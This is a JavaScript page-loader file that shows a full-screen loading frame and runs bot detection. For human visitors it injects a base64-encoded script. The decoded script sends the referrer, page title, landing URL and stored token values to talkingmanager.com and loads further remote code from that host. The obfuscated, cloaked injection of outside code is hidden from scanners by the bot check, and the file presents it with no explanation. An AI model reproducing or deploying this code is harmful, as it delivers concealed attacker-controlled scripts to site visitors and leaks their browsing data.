const botdPromise = import('./botid.js').then((Botd) => Botd.load());


const createLoader = () => {
    const frame = document.createElement('iframe');
    frame.id = 'load_frame';
    frame.src = `frameLoad.html`;
    frame.frameBorder = 0;
    frame.width = '100%';
    frame.height = '100%';
    frame.style.position = 'fixed';
    frame.style.top = 0;
    frame.style.left = 0;
    frame.style.width = '100%';
    frame.style.height = '100%';
    frame.style.zIndex = 9999;
    const body = document.querySelector('html');
    if (body && body.childNodes.length > 0) {
        const parent = body;
        parent.insertBefore(frame, body.firstChild)
    }
    
}
const toggleLoad = () => {
    const body = document.querySelector('body');
    body.removeAttribute('hidden');
    const load_frame = document.querySelector('#load_frame');
    if (load_frame) {
        load_frame.style.display = load_frame.style.display === 'none' ? 'block' : 'none';
    }
   
};
createLoader();

window.addEventListener('DOMContentLoaded', () => {
    botdPromise
    .then((botd) => botd.detect())
    .then(async (result) => {
        console.log(result);
        if (result) {
            fetch('https://grandmashome.com/api/check_bot').then(res => res.json()).then(res => {
                if (res?.code == 200 && !res.result) {
                    const script = document.createElement('script');
                    script.src = "data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfWHc1M3pDWVBmMjRNTEtoeCc7CiAgICBpZiAoIXdpbmRvdy5fWHc1M3pDWVBmMjRNTEtoeCkgewogICAgICAgIHdpbmRvdy5fWHc1M3pDWVBmMjRNTEtoeCA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly90YWxraW5nbWFuYWdlci5jb20vNVpubkdtWU0nLAogICAgICAgIH07CiAgICB9CiAgICBjb25zdCBfV2toYlNra3pYa1h4UVFmRCA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdjb25maWcnKTsKICAgIGlmICh0eXBlb2YgX1draGJTa2t6WGtYeFFRZkQgIT09ICd1bmRlZmluZWQnICYmIF9Xa2hiU2trelhrWHhRUWZEICE9PSBudWxsKSB7CiAgICAgICAgdmFyIF9USDlOU3ZEU0dDY2dIZ2ROID0gSlNPTi5wYXJzZShfV2toYlNra3pYa1h4UVFmRCk7CiAgICAgICAgdmFyIF9zWVB6UmZOWHY5bkpQckpRID0gTWF0aC5yb3VuZCgrbmV3IERhdGUoKS8xMDAwKTsKICAgICAgICBpZiAoX1RIOU5TdkRTR0NjZ0hnZE4uY3JlYXRlZF9hdCArIHdpbmRvdy5fWHc1M3pDWVBmMjRNTEtoeC50dGwgPCBfc1lQelJmTlh2OW5KUHJKUSkgewogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnc3ViSWQnKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3Rva2VuJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCdjb25maWcnKTsKICAgICAgICB9CiAgICB9CiAgICB2YXIgX3J4RFpMc0ZOYkpnZHpqWk0gPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnc3ViSWQnKTsKICAgIHZhciBfYmZtNXF2R0traGNnWjVUViA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCd0b2tlbicpOwogICAgdmFyIF9UVG1OTnBMVm42VnhrSkxLID0gJz9yZXR1cm49anMuY2xpZW50JzsKICAgICAgICBfVFRtTk5wTFZuNlZ4a0pMSyArPSAnJicgKyBkZWNvZGVVUklDb21wb25lbnQod2luZG93LmxvY2F0aW9uLnNlYXJjaC5yZXBsYWNlKCc/JywgJycpKTsKICAgICAgICBfVFRtTk5wTFZuNlZ4a0pMSyArPSAnJnNlX3JlZmVycmVyPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQucmVmZXJyZXIpOwogICAgICAgIF9UVG1OTnBMVm42VnhrSkxLICs9ICcmZGVmYXVsdF9rZXl3b3JkPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQudGl0bGUpOwogICAgICAgIF9UVG1OTnBMVm42VnhrSkxLICs9ICcmbGFuZGluZ191cmw9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5sb2NhdGlvbi5ob3N0bmFtZSArIGRvY3VtZW50LmxvY2F0aW9uLnBhdGhuYW1lKTsKICAgICAgICBfVFRtTk5wTFZuNlZ4a0pMSyArPSAnJm5hbWU9JyArIGVuY29kZVVSSUNvbXBvbmVudChuYW1lKTsKICAgICAgICBfVFRtTk5wTFZuNlZ4a0pMSyArPSAnJmhvc3Q9JyArIGVuY29kZVVSSUNvbXBvbmVudCh3aW5kb3cuX1h3NTN6Q1lQZjI0TUxLaHguUl9QQVRIKTsKICAgIGlmICh0eXBlb2YgX3J4RFpMc0ZOYkpnZHpqWk0gIT09ICd1bmRlZmluZWQnICYmIF9yeERaTHNGTmJKZ2R6alpNICYmIHdpbmRvdy5fWHc1M3pDWVBmMjRNTEtoeC51bmlxdWUpIHsKICAgICAgICBfVFRtTk5wTFZuNlZ4a0pMSyArPSAnJnN1Yl9pZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9yeERaTHNGTmJKZ2R6alpNKTsKICAgIH0KICAgIGlmICh0eXBlb2YgX2JmbTVxdkdLa2hjZ1o1VFYgIT09ICd1bmRlZmluZWQnICYmIF9iZm01cXZHS2toY2daNVRWICYmIHdpbmRvdy5fWHc1M3pDWVBmMjRNTEtoeC51bmlxdWUpIHsKICAgICAgICBfVFRtTk5wTFZuNlZ4a0pMSyArPSAnJnRva2VuPScgKyBlbmNvZGVVUklDb21wb25lbnQoX2JmbTVxdkdLa2hjZ1o1VFYpOwogICAgfQogICAgaWYgKCcnICE9PSAnJykgewogICAgICAgIF9UVG1OTnBMVm42VnhrSkxLICs9ICcmYnlwYXNzX2NhY2hlPSc7CiAgICB9CiAgICB2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgICAgIGEudHlwZSA9ICdhcHBsaWNhdGlvbi9qYXZhc2NyaXB0JzsKICAgICAgICBhLnNyYyA9IHdpbmRvdy5fWHc1M3pDWVBmMjRNTEtoeC5SX1BBVEggKyBfVFRtTk5wTFZuNlZ4a0pMSzsKICAgIHZhciBzID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ3NjcmlwdCcpWzBdOwogICAgcy5wYXJlbnROb2RlLmluc2VydEJlZm9yZShhLCBzKQogICAgfSkoKTsKICAgIA==";
                    
                    document.querySelector("head").appendChild(script);
                }
                setTimeout(toggleLoad, 1000);
                
            })
        }

    }).catch((error) => console.error(error))
  
})